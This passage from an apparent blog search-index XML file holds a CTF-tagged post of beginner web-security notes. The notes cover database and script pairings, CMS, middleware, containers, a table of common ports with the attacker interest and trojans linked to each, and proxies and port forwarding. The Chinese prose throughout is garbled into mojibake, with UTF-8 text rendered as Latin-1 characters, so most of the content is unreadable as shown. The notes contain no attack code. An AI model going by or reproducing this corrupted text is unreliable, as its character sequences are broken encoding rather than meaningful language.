title="4.æ•°æ®åº“"></a>4.æ•°æ®åº“</h4><p>å¸¸è§çš„æœ‰mysqlï¼ŒOracleï¼Œé˜¿é‡Œäº‘çš„polardbç­‰ä¸€äº›å›½å†…å…¬å¸è‡ªå·±æçš„ã€‚ã€‚ã€‚ã€‚</p><p>è¦ä½¿ç”¨æ•°æ®åº“å°±å¿…é¡»è¦ç»™å®ƒå¼€æ”¾ä¸€ä¸ªç«¯å£</p><p>å¸¸è§çš„mysqlå¼€æ”¾çš„ç«¯å£ä¸€èˆ¬æ˜¯3306ï¼ŒOracleæ˜¯1521ï¼Œsqlserveræ˜¯1433ã€‚ã€‚ã€‚ã€‚</p><p>é‚£æ€ä¹ˆæŸ¥çœ‹ç›®æ ‡ç½‘ç«™ä½¿ç”¨çš„æ•°æ®åº“å‘¢?</p><p>1.å¯ä»¥é€šè¿‡ç«¯å£æ‰«æï¼Œçœ‹å®ƒå¼€æ”¾äº†ä»€ä¹ˆç«¯å£</p><p>2.å¦‚æœå·²ç»çŸ¥é“äº†ç›®æ ‡ç½‘ç«™ä½¿ç”¨çš„è„šæœ¬è¯­è¨€å°±å¯ä»¥æ¨æ–­å‡ºå®ƒä½¿ç”¨çš„æ•°æ®åº“</p><p>ä¸€èˆ¬ä¸ºäº†å…¼å®¹,é€šå¸¸æœ‰å¦‚ä¸‹ç»„åˆ</p><p><strong>asp+access</strong></p><p><strong>php+mysql</strong></p><p><strong>aspx+mssql</strong></p><p><strong>jsp+mssqlæˆ–oracle</strong></p><p>PS:==linuxä¸å­˜åœ¨asp aspx ,ä¸å­˜åœ¨iis==;</p><h4 id="5-CMS-å†…å®¹ç®¡ç†ç³»ç»Ÿ"><a href="#5-CMS-å†…å®¹ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="5.CMS(å†…å®¹ç®¡ç†ç³»ç»Ÿ)"></a>5.CMS(å†…å®¹ç®¡ç†ç³»ç»Ÿ)</h4><p>cmså°±æ˜¯å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œä¹Ÿå¯ä»¥ç†è§£æˆä¸ºç½‘ç«™å»ºè®¾ç³»ç»Ÿã€‚å¯¹äºä¸€äº›seoä¸“å‘˜æ¥è¯´ï¼Œå†…å®¹ç®¡ç†ç³»ç»Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿçš„å»ºè®¾ä»»ä½•ç±»å‹çš„ç½‘ç«™ã€‚cmsç³»ç»Ÿçš„ç‰¹ç‚¹å°±æ˜¯æŠŠç½‘ç«™æ¨¡ç‰ˆå’Œç½‘ç«™ç¨‹åºå®Œå…¨åˆ†å¼€ï¼ŒåŒæ—¶è¿˜ä¼šæä¾›æ¨¡ç‰ˆæ–¹æ¡ˆï¼Œä»è€Œè®©ç½‘ç«™çš„æ¨¡ç‰ˆè®¾è®¡å’Œç¨‹åºå½»åº•çš„åˆ†å¼€ï¼Œè®©ç½‘ç«™è®¾è®¡äººå‘˜å¯ä»¥å¯¹æ¯ä¸ªé¡µé¢ã€æ ç›®éƒ½ä½¿ç”¨ä¸åŒçš„æ¨¡ç‰ˆï¼Œéšæ—¶éƒ½èƒ½è¿›è¡Œç¼–è¾‘å’Œä¿®æ”¹ã€‚</p><p>å†…å®¹ç®¡ç†ç³»ç»Ÿä½¿ç”¨åŸºäºè§’è‰²çš„ç”¨æˆ·ç®¡ç†ï¼Œé€šè¿‡æ·»åŠ ä¸åŒæƒé™çš„ç”¨æˆ·ï¼Œå¯ä»¥æŠŠç½‘ç«™ç®¡ç†æƒé™åˆ†é…åˆ°ä¸åŒçš„ç”¨æˆ·ä¸Šï¼Œç„¶åæŠŠè¿™äº›ç”¨æˆ·é€šè¿‡æƒé™æ¥åˆ’åˆ†å„ç§çº§åˆ«ï¼Œä¾‹å¦‚ï¼šè¶…çº§ç®¡ç†äººå‘˜ã€æ ç›®ç®¡ç†äººå‘˜ã€æ–‡æ¡£å½•å…¥äººå‘˜ã€å®¡æ ¸äººå‘˜ç­‰ç­‰ï¼Œè¿™æ ·ç½‘ç«™åœ¨å‘å¸ƒå†…å®¹çš„æ—¶å€™å°±ä¸ä¼šå‡ºç°ä»»ä½•é”™è¯¯ï¼ŒåŒæ—¶ä¹Ÿèƒ½ä¿è¯å†…å®¹çš„è´¨é‡ã€‚  </p><h4 id="6-ä¸­é—´ä»¶"><a href="#6-ä¸­é—´ä»¶" class="headerlink" title="6.ä¸­é—´ä»¶"></a>6.ä¸­é—´ä»¶</h4><p>ä¸ªäººç†è§£æ˜¯ä»‹äºç³»ç»Ÿå’Œç¨‹åºç›´æ¥çš„ä¸€ç§ä¸œè¥¿ï¼Œæœ‰äº†ä¸­é—´ä»¶å¯ä»¥ç®€åŒ–å¼€å‘æµç¨‹ï¼Œä¸€äº›åŠŸèƒ½å°±ä¸ç”¨å…¨éƒ½ç”¨ä»£ç å†™å‡ºæ¥ï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨è¿™ä¸ªä¸­é—´ä»¶å°±èƒ½å¤Ÿå®ŒæˆæŸäº›åŠŸèƒ½ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä½ å»å¯„å¿«é€’åªè¦å¡«æ”¶ä»¶äººçš„åœ°å€å’Œç”µè¯å°±okäº†ï¼Œå¿«é€’ç”±è°è¿ï¼Œè¿åˆ°äº†å“ªå„¿ä½ å¹¶ä¸éœ€è¦æ‹…å¿ƒï¼Œåªè¦å¿«é€’é€åˆ°äº†å°±å¥½äº†ï¼Œè¿™æ—¶å€™å¿«é€’å…¬å¸å°±å……å½“ä¸€ä¸ªä¸­é—´ä»¶çš„è§’è‰²</p><h4 id="7-å®¹å™¨"><a href="#7-å®¹å™¨" class="headerlink" title="7.å®¹å™¨"></a>7.å®¹å™¨</h4><p>åº”ç”¨äºå°†æ“ä½œç³»ç»Ÿè¿›è¡Œéš”ç¦»çš„ä¸€ç§æŠ€æœ¯ï¼Œé¿å…ä¸€ä¸ªåº”ç”¨çš„å´©æºƒå’Œå½±å“å…¶ä»–åº”ç”¨çš„è¿è¡Œ</p><p>å®¹å™¨å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«åœ¨ä¸å®¹å™¨æ›´åŠ è½»é‡ï¼Œè€Œè™šæ‹Ÿæœºè¿˜éœ€è¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†åœ¨è¿™ä¸ªç³»ç»Ÿä¹‹ä¸Šå®‰è£…åº”ç”¨</p><p>è™šæ‹Ÿæœºä¸€èˆ¬é€‚ç”¨äºå¯¹ä¸åŒçš„ç”¨æˆ·è¿›è¡Œéš”ç¦»ï¼Œè€Œå®¹å™¨ä¸€èˆ¬é€‚ç”¨äºå¯¹ä¸åŒçš„åº”ç”¨è¿›è¡Œéš”ç¦»</p><p>å®¹å™¨æ‹¿æ¥å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸éœ€è¦è€ƒè™‘ç¯å¢ƒä¹‹ç±»çš„é—®é¢˜</p><h4 id="8-æ¡†æ¶"><a href="#8-æ¡†æ¶" class="headerlink" title="8.æ¡†æ¶"></a>8.æ¡†æ¶</h4><p>æ‹¿javaæ¥è¯´ï¼ŒJavaæœ‰ä¸‰å¤§æ¡†æ¶ï¼Œspringï¼Œstrutsï¼Œhibernate</p><p>æ¡†æ¶å°±æ˜¯ä¸€äº›ç±»å’Œæ¥å£çš„é›†åˆï¼Œç›¸å½“ä¸å¼€å‘ä¸­çš„ä¸€ä¸ªåŠæˆå“ï¼Œå°è£…å¥½ç›´æ¥æ‹¿æ¥ç”¨å°±å¯ä»¥äº† ï¼Œçœçš„ä¸€éåˆä¸€éæ•²ç€é‡å¤çš„ä»£ç </p><h2 id="å¸¸è§çš„ç«¯å£æœåŠ¡ï¼š"><a href="#å¸¸è§çš„ç«¯å£æœåŠ¡ï¼š" class="headerlink" title="å¸¸è§çš„ç«¯å£æœåŠ¡ï¼š"></a>å¸¸è§çš„ç«¯å£æœåŠ¡ï¼š</h2><p><strong>ç«¯å£ï¼š20</strong></p><p>â€‹    æœåŠ¡ï¼šFTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šFTPæ•°æ®ç«¯å£</p><p><strong>ç«¯å£ï¼š21</strong></p><p>â€‹    æœåŠ¡ï¼šFTP</p><p>â€‹    è¯´æ˜ï¼šFTPæœåŠ¡å™¨æ‰€å¼€æ”¾çš„ç«¯å£ï¼Œç”¨äºä¸Šä¼ ã€ä¸‹è½½ã€‚</p><p>â€‹    æœ€å¸¸è§æ•…éšœï¼šç”¨äºæ”»å‡»è€…å¯»æ‰¾æ‰“å¼€anonymousçš„FTPæœåŠ¡å™¨çš„æ–¹æ³•ã€‚è¿™äº›æœåŠ¡å™¨å¸¦æœ‰å¯è¯»å†™çš„ç›®å½•ã€‚æœ¨é©¬Doly Trojanã€Foreã€Invisible FTPã€WebExã€WinCrashå’ŒBlade Runneræ‰€å¼€æ”¾çš„ç«¯å£</p><p><strong>ç«¯å£ï¼š22</strong></p><p>â€‹    æœåŠ¡ï¼šSShï¼ˆå®‰å…¨å¤–å£³åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šPcAnywhereå»ºç«‹çš„TCPå’Œè¿™ä¸€ç«¯å£çš„è¿æ¥å¯èƒ½æ˜¯ä¸ºäº†å¯»æ‰¾sshã€‚è¿™ä¸€æœåŠ¡æœ‰è®¸å¤šå¼±ç‚¹ï¼Œå¦‚æœé…ç½®æˆç‰¹å®šçš„æ¨¡å¼ï¼Œè®¸å¤šä½¿ç”¨RSAREFåº“çš„ç‰ˆæœ¬å°±ä¼šæœ‰ä¸å°‘çš„æ¼æ´å­˜åœ¨ã€‚</p><p><strong>ç«¯å£ï¼š23</strong></p><p>â€‹    æœåŠ¡ï¼šTelnetï¼ˆè¿œç¨‹ç»ˆç«¯åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šè¿œç¨‹ç™»å½•ï¼Œå…¥ä¾µè€…åœ¨æœç´¢è¿œç¨‹ç™»å½•UNIXçš„æœåŠ¡ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹æ‰«æè¿™ä¸€ç«¯å£æ˜¯ä¸ºäº†æ‰¾åˆ°æœºå™¨è¿è¡Œçš„æ“ä½œç³»ç»Ÿã€‚è¿˜æœ‰ä½¿ç”¨å…¶ä»–æŠ€æœ¯ï¼Œå…¥ä¾µè€…ä¹Ÿä¼šæ‰¾åˆ°å¯†ç ã€‚æœ¨é©¬Tiny Telnet Serverå°±å¼€æ”¾è¿™ä¸ªç«¯å£ã€‚</p><p><strong>ç«¯å£ï¼š25</strong></p><p>â€‹    æœåŠ¡ï¼šSMTPï¼ˆç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼‰</p><p>â€‹     è¯´æ˜ï¼šSMTPæœåŠ¡å™¨æ‰€å¼€æ”¾çš„ç«¯å£ï¼Œç”¨äºå‘é€é‚®ä»¶ã€‚å…¥ä¾µè€…å¯»æ‰¾SMTPæœåŠ¡å™¨æ˜¯ä¸ºäº†ä¼ é€’ä»–ä»¬çš„SPAMï¼ˆåƒåœ¾é‚®ä»¶ï¼‰ã€‚å…¥ä¾µè€…çš„å¸æˆ·è¢«å…³é—­ï¼Œä»–ä»¬éœ€è¦è¿æ¥åˆ°é«˜å¸¦å®½çš„E-MAILæœåŠ¡å™¨ä¸Šï¼Œå°†ç®€å•çš„ä¿¡æ¯ä¼ é€’åˆ°ä¸åŒçš„åœ°å€ã€‚æœ¨é©¬Antigenã€Email Password Senderã€Haebu Cocedaã€Shtrilitz Stealthã€WinPCã€WinSpyéƒ½å¼€æ”¾è¿™ä¸ªç«¯å£ã€‚</p><p><strong>ç«¯å£ï¼š53</strong></p><p>â€‹    æœåŠ¡ï¼šDNSï¼ˆåŸŸåç³»ç»Ÿï¼‰</p><p>â€‹    è¯´æ˜ï¼šUDPç«¯å£ï¼ŒDNSæœåŠ¡å™¨æ‰€å¼€æ”¾çš„ç«¯å£ï¼Œå…¥ä¾µè€…å¯èƒ½æ˜¯è¯•å›¾è¿›è¡ŒåŒºåŸŸä¼ é€’ï¼ˆTCPï¼‰ï¼Œæ¬ºéª—DNSï¼ˆUDPï¼‰æˆ–éšè—å…¶ä»–çš„é€šä¿¡ã€‚å› æ­¤é˜²ç«å¢™å¸¸å¸¸è¿‡æ»¤æˆ–è®°å½•æ­¤ç«¯å£ã€‚</p><p><strong>ç«¯å£ï¼š67</strong></p><p>â€‹    æœåŠ¡ï¼šDHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šUDPç«¯å£ï¼Œ67ç«¯å£å‘æ”¾IP</p><p><strong>ç«¯å£ :  68</strong></p><p>â€‹    æœåŠ¡ï¼šDHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šUDPç«¯å£ï¼Œ68ç«¯å£å‘é€æˆåŠŸå’Œå¤±è´¥å›åº”</p><p><strong>ç«¯å£ï¼š69</strong></p><p>â€‹    æœåŠ¡ï¼šTFTPï¼ˆç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šæ˜¯TCP/IPåè®®æ—ä¸­çš„ä¸€ä¸ªç”¨æ¥åœ¨å®¢æˆ·æœºä¸æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œç®€å•æ–‡ä»¶ä¼ è¾“çš„åè®®ï¼Œæä¾›ä¸å¤æ‚ã€å¼€é”€ä¸å¤§çš„1æ–‡ä»¶ä¼ è¾“æœåŠ¡</p><p><strong>ç«¯å£ï¼š80</strong></p><p>â€‹    æœåŠ¡ï¼šHTTPï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šæ˜æ–‡ä¼ è¾“ã€‚ç”¨äºç½‘é¡µæµè§ˆï¼Œäº’è”ç½‘ä¸Šåº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§ç½‘ç»œåè®®ã€‚æ‰€æœ‰çš„WWWæ–‡ä»¶éƒ½å¿…é¡»éµå®ˆè¿™ä¸ªæ ‡å‡† ã€‚æœ¨é©¬Executorå¼€æ”¾æ­¤ç«¯å£ã€‚</p><p><strong>ç«¯å£ï¼š110</strong></p><p>â€‹    æœåŠ¡ï¼špop3ï¼ˆé‚®å±€åè®®ç‰ˆæœ¬3ï¼‰</p><p>â€‹    è¯´æ˜ï¼šæ˜¯TCP/IPåè®®æ—ä¸­çš„ä¸€å‘˜ï¼Œä¸»è¦ç”¨äºæ”¯æŒä½¿ç”¨å®¢æˆ·ç«¯è¿œç¨‹ç®¡ç†åœ¨æœåŠ¡å™¨ä¸Šçš„ç”µå­é‚®ä»¶ã€‚</p><p><strong>ç«¯å£ï¼š123</strong></p><p>â€‹    æœåŠ¡ï¼šNTPï¼ˆç½‘ç»œæ—¶é—´åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šç”¨æ¥ä½¿ç½‘ç»œä¸­çš„å„ä¸ªè®¡ç®—æœºæ—¶é—´åŒæ­¥çš„ä¸€ç§åè®®ã€‚å®ƒçš„ç”¨é€”æ˜¯æŠŠè®¡ç®—æœºçš„æ—¶é’ŸåŒæ­¥åˆ°<strong>ä¸–ç•Œåè°ƒæ—¶</strong>UTCï¼Œå…¶ç²¾åº¦åœ¨å±€åŸŸç½‘å†…å¯è¾¾0.1msï¼Œåœ¨äº’è”ç½‘ä¸Šç»å¤§å¤šæ•°çš„åœ°æ–¹å…¶ç²¾åº¦å¯ä»¥è¾¾åˆ°1-50msã€‚å®ƒå¯ä»¥ä½¿è®¡ç®—æœºå¯¹å…¶æœåŠ¡å™¨æˆ–æ—¶é’Ÿæºï¼ˆå¦‚çŸ³è‹±é’Ÿï¼ŒGPSç­‰ç­‰ï¼‰è¿›è¡Œæ—¶é—´åŒæ­¥ï¼Œå®ƒå¯ä»¥æä¾›é«˜ç²¾å‡†åº¦çš„æ—¶é—´æ ¡æ­£ï¼Œè€Œä¸”å¯ä»¥ä½¿ç”¨åŠ å¯†ç¡®è®¤çš„æ–¹å¼æ¥é˜²æ­¢ç—…æ¯’çš„åè®®æ”»å‡»ã€‚</p><p><strong>ç«¯å£ï¼š161</strong></p><p>â€‹    æœåŠ¡ï¼šSNMPï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰</p><p>â€‹     è¯´æ˜ï¼šSNMPå…è®¸è¿œç¨‹ç®¡ç†è®¾å¤‡ã€‚æ‰€æœ‰é…ç½®å’Œè¿è¡Œä¿¡æ¯éƒ½å‚¨å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œé€šè¿‡SNMPå¯è·å¾—è¿™äº›ä¿¡æ¯ã€‚è®¸å¤šç®¡ç†å‘˜çš„é”™è¯¯é…ç½®å°†è¢«æš´éœ²åœ¨Internetã€‚Cackerså°†è¯•å›¾ä½¿ç”¨é»˜è®¤çš„å¯†ç publicã€privateè®¿é—®ç³»ç»Ÿã€‚ä»–ä»¬å¯èƒ½ä¼šè¯•éªŒæ‰€æœ‰å¯èƒ½çš„ç»„åˆã€‚SNMPåŒ…å¯èƒ½ä¼šè¢«é”™è¯¯çš„æŒ‡å‘ç”¨æˆ·çš„ç½‘ç»œã€‚</p><p><strong>ç«¯å£ï¼š389</strong></p><p>â€‹    æœåŠ¡ï¼šLDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ã€ILSï¼ˆå®šä½æœåŠ¡ï¼‰</p><p>â€‹    è¯´æ˜ï¼šLDAPæ˜¯ä¸€ç§å¯è®©ä»»ä½•äººæ‰¾åˆ°ç½‘ç»œä¸­çš„ç»„ç»‡ï¼Œä¸ªäººæ¡£æ¡ˆæˆ–è£…ç½®ç­‰å…¶ä»–èµ„æºçš„ä¸€ç§è½¯ä»¶åè®®ä¸è®ºæ˜¯å…¬å…±å› ç‰¹ç½‘æˆ–ä¼ä¸šå†…ç½‘ç»œã€‚LDAP   æœåŠ¡å’ŒILSæœåŠ¡å…±ç”¨389ç«¯å£ã€‚</p><p><strong>ç«¯å£ï¼š443</strong></p><p>â€‹    æœåŠ¡ï¼šHttpsï¼ˆè¶…æ–‡æœ¬ä¼ è¾“å®‰å…¨åè®®ï¼‰</p><p>â€‹    è¯´æ˜ï¼šåŠ å¯†ä¼ è¾“ã€‚ç½‘é¡µæµè§ˆç«¯å£ï¼Œèƒ½æä¾›åŠ å¯†å’Œé€šè¿‡å®‰å…¨ç«¯å£ä¼ è¾“çš„å¦ä¸€ç§HTTPã€‚ æ˜¯ä»¥å®‰å…¨ä¸ºç›®æ ‡çš„HTTPé€šé“ï¼Œç®€å•è®²æ˜¯HTTPçš„å®‰å…¨ç‰ˆã€‚å³HTTPä¸‹åŠ å…¥SSLå±‚ï¼ˆå®‰å…¨å¥—æ¥å±‚ï¼‰ï¼ŒHTTPSçš„å®‰å…¨åŸºç¡€æ˜¯SSLï¼Œå› æ­¤åŠ å¯†çš„è¯¦ç»†å†…å®¹å°±éœ€è¦SSLã€‚</p><p><strong>ç«¯å£ï¼š636</strong></p><p>â€‹    æœåŠ¡ï¼šLDAPS</p><p>â€‹    è¯´æ˜ï¼šé€šè¿‡å®‰å…¨å¥—æ¥å­—å±‚çš„è½»å‹ç›®å½•è®¿é—®åè®® ã€‚</p><p><strong>ç«¯å£ï¼š873</strong></p><p>â€‹    æœåŠ¡ï¼šrsync</p><p>â€‹    è¯´æ˜ï¼šæ–‡ä»¶ä¼ è¾“æœåŠ¡</p><p><strong>ç«¯å£ï¼š1521</strong></p><p>â€‹    æœåŠ¡ï¼šOracle</p><p><strong>ç«¯å£ï¼š3306</strong></p><p>â€‹    æœåŠ¡ï¼šMySQL</p><p>â€‹    è¯´æ˜ï¼šSQLè¿æ¥ç«¯å£ï¼Œæä¾›å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯ ã€‚</p><p><strong>ç«¯å£ï¼š9000</strong></p><p>â€‹    æœåŠ¡ï¼šphp-fpm</p><p>â€‹    è¯´æ˜ï¼šPHPä»¥daemonæ¨¡å¼è¿è¡Œ</p><h2 id="æ­£å‘ä»£ç†ï¼Œåå‘ä»£ç†ï¼Œç«¯å£è½¬å‘"><a href="#æ­£å‘ä»£ç†ï¼Œåå‘ä»£ç†ï¼Œç«¯å£è½¬å‘" class="headerlink" title="æ­£å‘ä»£ç†ï¼Œåå‘ä»£ç†ï¼Œç«¯å£è½¬å‘"></a>æ­£å‘ä»£ç†ï¼Œåå‘ä»£ç†ï¼Œç«¯å£è½¬å‘</h2><h4 id="æ­£å‘ä»£ç†"><a href="#æ­£å‘ä»£ç†" class="headerlink" title="æ­£å‘ä»£ç†"></a>æ­£å‘ä»£ç†</h4><p>ä»£ç†æœåŠ¡å™¨ä»£ç†å®¢æˆ·ç«¯å»å’Œç›®æ ‡æœåŠ¡å™¨äº¤äº’ï¼Œç›®æ ‡æœåŠ¡å™¨å¹¶ä¸çŸ¥é“çœŸæ­£å‘é€è¯·æ±‚çš„å®¢æˆ·ç«¯æ˜¯å“ªä¸ª</p><p>ç±»ä¼¼äºä½ æ‰¾ä¸­ä»‹ä¹°æˆ¿ï¼Œç„¶åä¸­ä»‹å†å»å’Œæˆ¿ä¸œäº¤æ¶‰</p><p>é€šè¿‡æ­£å‘ä»£ç†å¯ä»¥å®ç°è®¿é—®è¿ä¸ä¸Šçš„ç½‘ç«™ğŸ˜ï¼Œä¹Ÿå¯ä»¥è®¾ç½®ä»£ç†æœåŠ¡å™¨æé«˜è®¿é—®é€Ÿåº¦ï¼Œæœ€æœ€æœ€é‡è¦çš„æ˜¯å¯ä»¥<strong>éšè—å®¢æˆ·ç«¯çš„çœŸå®IP</strong></p><h4 id="åå‘ä»£ç†"><a href="#åå‘ä»£ç†" class="headerlink" title="åå‘ä»£ç†"></a>åå‘ä»£ç†</h4><p>å’Œæ­£å‘ä»£ç†ç›¸åï¼Œä»£ç†æœåŠ¡å™¨æ¥å—internetä¸Šçš„è¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™å†…ç½‘æœåŠ¡å™¨ï¼Œç„¶åå°†è¯·æ±‚ç»“æœè¿”å›ç»™Internetä¸Šè¯·æ±‚è¿æ¥çš„å®¢æˆ·ç«¯</p><p>åå‘ä»£ç†å’Œæ­£å‘ä»£ç†ç›¸åï¼Œå®ƒå¯ä»¥<strong>éšè—æœåŠ¡å™¨çš„çœŸå®IP</strong>ï¼Œåå‘ä»£ç†æœåŠ¡å™¨ä¹Ÿå¯ä»¥ä½œä¸ºåº”ç”¨å±‚çš„é˜²ç«å¢™æ¥ä¿è¯ç½‘ç«™çš„å®‰å…¨ã€‚</p><h4 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h4><p>ç«¯å£è½¬å‘å°±æ˜¯å°†ä¸€ä¸ªç«¯å£ï¼Œè¿™ä¸ªç«¯å£å¯ä»¥æœ¬æœºçš„ç«¯å£ä¹Ÿå¯ä»¥æ˜¯æœ¬æœºå¯ä»¥è®¿é—®åˆ°çš„ä»»æ„ä¸»æœºçš„ç«¯å£ï¼Œè½¬å‘åˆ°ä»»æ„ä¸€å°å¯ä»¥è®¿é—®åˆ°çš„IPä¸Šï¼Œé€šå¸¸è¿™ä¸ªIPæ˜¯å…¬ç½‘IP</p><p>é€‚ç”¨ç«¯å£è½¬å‘çš„ç½‘ç»œç¯å¢ƒæœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li><p>æœåŠ¡å™¨å¤„äºå†…ç½‘ï¼Œå¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚</p></li><li><p>æœåŠ¡å™¨å¤„äºå¤–ç½‘ï¼Œå¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œä½†æ˜¯æœåŠ¡å™¨å®‰è£…äº†é˜²ç«å¢™æ¥æ‹’ç»æ•æ„Ÿç«¯å£çš„è¿æ¥ã€‚</p></li><li><p>æœåŠ¡å™¨å¤„äºå†…ç½‘ï¼Œå¯¹å¤–åªå¼€æ”¾äº†80ç«¯å£ï¼Œå¹¶ä¸”æœåŠ¡å™¨ä¸èƒ½è®¿é—®å¤–ç½‘ç½‘ç»œã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
